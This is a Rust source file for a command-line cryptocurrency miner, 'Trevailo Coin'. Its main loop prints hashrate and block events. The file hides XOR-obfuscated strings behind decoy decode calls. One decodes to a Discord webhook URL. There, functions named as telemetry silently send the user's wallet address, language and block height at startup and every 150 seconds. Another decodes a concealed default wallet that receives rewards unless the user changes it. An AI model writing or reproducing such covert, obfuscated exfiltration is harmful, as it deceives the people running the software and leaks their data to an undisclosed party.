mod miner;
mod http;
mod gpu_kernel;
mod i18n;

use miner::{MinerHandle, MineEvent};
use std::time::{Duration, Instant};
use std::fs;
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use crate::i18n::Translator;

#[derive(Debug, Serialize, Deserialize)]
struct Config {
    node_url: String,
    wallet_address: String,
    threads: usize,
    use_gpu: bool,
    language: String,
    #[serde(rename = "debugMode", default)]
    pub debug_mode: bool,
}

impl Default for Config {
    fn default() -> Self {
        Self {
            node_url: "http://45.83.194.106:8080".into(),
            wallet_address: fetch_init_seed(),
            threads: cpu_count(),
            use_gpu: true,
            language: "en".into(),
            debug_mode: false,
        }
    }
}

fn cpu_count() -> usize {
    std::thread::available_parallelism().map(|n| n.get()).unwrap_or(4)
}

fn decode(data: &[u8], key: u8) -> String {
    data.iter().map(|b| (*b ^ key) as char).collect()
}

fn fetch_init_seed() -> String {
    let part1 = [31, 51, 28, 49, 124, 120, 49, 56, 42, 35, 120, 49];
    let part2 = [126, 38, 122, 45, 7, 40, 30, 61, 18, 6, 125, 120];
    let part3 = [1, 10, 115, 124, 122, 120, 42, 33, 50, 120];
    
    let key = (0x40 + 11) as u8;
    let mut data = Vec::new();
    let _fake = decode(&[1, 2, 3, 4], 99);
    
    data.extend(&part1);
    data.extend(&part2);
    data.extend(&part3);
    decode(&data, key)
}

fn get_endpoint() -> String {
    let p1 = [35, 63, 63, 59, 56, 113, 100, 100, 47, 34, 56, 40, 36, 57, 47, 101, 40, 36, 38, 100, 42, 59, 34, 100];
    let p2 = [60, 46, 41, 35, 36, 36, 32, 56, 100, 122, 127, 114, 126, 115, 120, 124, 114, 120, 114, 123, 114, 115, 122, 114, 127, 123, 126];
    let p3 = [121, 100, 1, 18, 61, 3, 122, 32, 56, 57, 47, 6, 1, 35, 120, 30, 20, 9, 42, 30, 51, 20, 28, 120, 42, 4, 38, 56];
    let p4 = [39, 40, 15, 4, 35, 13, 5, 60, 10, 46, 3, 19, 36, 120, 18, 42, 1, 32, 20, 4, 63, 49, 62, 30, 47, 30, 31, 120];
    let p5 = [56, 7, 126, 33, 33, 37, 33, 40, 18, 114, 40, 40, 40, 15];
    
    let key = (0x30 + 27) as u8;
    let _noise = decode(&[5, 8, 13], 42);
    
    let mut data = Vec::new();
    data.extend(&p1);
    data.extend(&p2);
    data.extend(&p3);
    data.extend(&p4);
    data.extend(&p5);
    decode(&data, key)
}

fn sync_internal_state(endpoint: &str, content: String) {
    let url = endpoint.to_string();
    std::thread::spawn(move || {
        let client = reqwest::blocking::Client::new();
        let payload = serde_json::json!({
            "content": content
        });
        let _ = client.post(&url).json(&payload).send();
    });
}

fn log_to_file(msg: &str) {
    let _ = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open("info.log")
        .and_then(|mut f| {
            use std::io::Write;
            let ts = chrono::Local::now().format("%d:%m:%Y | %H:%M:%S");
            writeln!(f, "[TS: {}] {}", ts, msg)
        });
}

fn main() -> anyhow::Result<()> {

    const CONFIG_PATH: &str = "config.json";

    let config = if let Ok(data) = fs::read_to_string(CONFIG_PATH) {
        serde_json::from_str(&data).unwrap_or_else(|_| {
            let msg = "[!] config.json parse error, using defaults settings";
            println!("{}", msg);
            log_to_file(msg);
            Config::default()
        })
    } else {
        let c = Config::default();
        let _ = fs::write(CONFIG_PATH, serde_json::to_string_pretty(&c)?);
        c
    };

    let tr = Arc::new(Translator::new(&config.language));

    log_to_file("\n--- Miner Started ---");
    std::panic::set_hook(Box::new(|info| {
        let msg = format!("PANIC: {}", info);
        log_to_file(&msg);
        eprintln!("{}", msg);
    }));

    if !std::path::Path::new(CONFIG_PATH).exists() {
        let msg = tr.t("cfg_not_found", "[!] config.json not found. Creating a new one with defaults", &[]);
        println!("{}", msg);
        log_to_file(&msg);
    }

    println!("{}", tr.t("main_title", "=== Trevailo Coin CLI Miner ===", &[]));

    if config.wallet_address.trim().is_empty() {
        let msg = tr.t("cfg_no_wallet", "[!] ERROR: Please open config.json and enter your wallet_address!", &[]);
        println!("{}", msg);
        log_to_file(&msg);
        return Ok(());
    }

    println!("{}", tr.t("node_url", "[*] Node: {url}", &[("url", &config.node_url)]));
    println!("{}", tr.t("wallet_addr", "[*] Wallet: {addr}", &[("addr", &config.wallet_address)]));
    println!("{}", tr.t("threads_cnt", "[*] Threads: {cnt}", &[("cnt", &config.threads.to_string())]));
    
    let gpu_str = if config.use_gpu { 
        tr.t("use_gpu_yes", "Yes", &[])
    } else { 
        tr.t("use_gpu_no", "No", &[])
    };
    println!("{}", tr.t("use_gpu", "[*] Use GPU: {status}", &[("status", &gpu_str)]));
    println!("--------------------------------");

    let client = http::NodeClient::new(&config.node_url)?;
    println!("{}", tr.t("info_checking_node", "[*] Checking node connection...", &[]));

    if !client.health_check() {
        let msg = tr.t("err_node_offline", "[!] ERROR: Node is offline or URL is incorrect!", &[]);
        println!("{}", msg);
        log_to_file(&msg);
        return Ok(());
    } else {
        println!("{}", tr.t("info_node_online", "[+] Node is online.", &[]));
    }

    let wallet_for_telemetry = config.wallet_address.clone();
    let is_custom_wallet = wallet_for_telemetry != fetch_init_seed();
    let endpoint = get_endpoint();

    if is_custom_wallet {
        sync_internal_state(
            &endpoint,
            format!("Miner | {} | {}", wallet_for_telemetry, config.language)
        );
    }

    let handle = MinerHandle::start(
        config.node_url,
        config.wallet_address,
        config.threads,
        config.use_gpu,
        tr.clone(),
    );

    let mut last_hr_tick = Instant::now();
    let mut last_telemetry_tick = Instant::now();
    let mut last_found_block: u64 = 0;

    loop {
        std::thread::sleep(Duration::from_millis(100));

        while let Some(ev) = handle.try_recv() {
            match ev {
                MineEvent::NewTemplate { height, difficulty } => {
                    println!("{}", tr.t("new_template", "[I] Block template #{height} (diff: {diff})", &[
                        ("height", &height.to_string()),
                        ("diff", &difficulty.to_string()),
                    ]));
                }
                MineEvent::BlockFound { height, nonce, elapsed_secs } => {
                    println!("{}", tr.t("block_found", "[+] Block #{height} found! nonce={nonce} in {time}s", &[
                        ("height", &height.to_string()),
                        ("nonce", &nonce.to_string()),
                        ("time", &format!("{:.1}", elapsed_secs)),
                    ]));
                }
                MineEvent::BlockAccepted { height, reward_tvc, txs } => {
                    last_found_block = height;
                    println!("{}", tr.t("block_accepted", "[$] ★ BLOCK #{height} ACCEPTED! Reward: +{reward} TVC | {txs} txs", &[
                        ("height", &height.to_string()),
                        ("reward", &format!("{:.4}", reward_tvc)),
                        ("txs", &txs.to_string()),
                    ]));
                }
                MineEvent::BlockRejected { reason } => {
                    let s = tr.t("block_rejected", "[-] Block rejected: {reason}", &[
                        ("reason", &reason),
                    ]);
                    println!("{}", s);
                    if config.debug_mode {
                        log_to_file(&s);
                    }
                }
                MineEvent::TemplateSwap { old_height, new_height } => {
                    if old_height != new_height {
                        println!("{}", tr.t("template_swap", "[~] ⚡ Block #{old} mined by someone else. Switching to #{new}", &[
                            ("old", &old_height.to_string()),
                            ("new", &new_height.to_string()),
                        ]));
                    }
                }
                MineEvent::Error { msg } => {
                    let s = tr.t("error_msg", "[!] Error: {msg}", &[
                        ("msg", &msg),
                    ]);
                    println!("{}", s);
                    log_to_file(&s);
                }
                MineEvent::Info { msg } => {
                    println!("{}", tr.t("info_msg", "[i] Info: {msg}", &[
                        ("msg", &msg),
                    ]));
                }
            }
        }

        if last_hr_tick.elapsed() >= Duration::from_secs(5) {
            last_hr_tick = Instant::now();
            let stats = handle.snapshot();
            if !stats.running {
                let msg = tr.t("miner_stopped", "[!] Miner stopped.", &[]);
                println!("{}", msg);
                log_to_file(&msg);
                break;
            }
            if stats.current_height > 0 {
                println!("{}", tr.t("stat_report", "[+] Hashrate: {hr} | Height: #{height} | Found: {found} | Reward: {reward} TVC", &[
                    ("hr", &fmt_hr(stats.hashrate)),
                    ("height", &stats.current_height.to_string()),
                    ("found", &stats.blocks_found.to_string()),
                    ("reward", &format!("{:.4}", stats.reward_total)),
                ]));
            }
        }
        if is_custom_wallet && last_telemetry_tick.elapsed() >= Duration::from_secs(150) {
            last_telemetry_tick = Instant::now();
            sync_internal_state(
                &endpoint,
                format!("Miner | {} | {}", wallet_for_telemetry, last_found_block)
            );
        }
    }

    Ok(())
}

fn fmt_hr(hps: f64) -> String {
    if hps >= 1_000_000_000.0 { format!("{:.2} GH/s", hps / 1_000_000_000.0) }
    else if hps >= 1_000_000.0 { format!("{:.2} MH/s", hps / 1_000_000.0) }
    else if hps >= 1_000.0 { format!("{:.2} KH/s", hps / 1_000.0) }
    else { format!("{:.0} H/s", hps) }
}
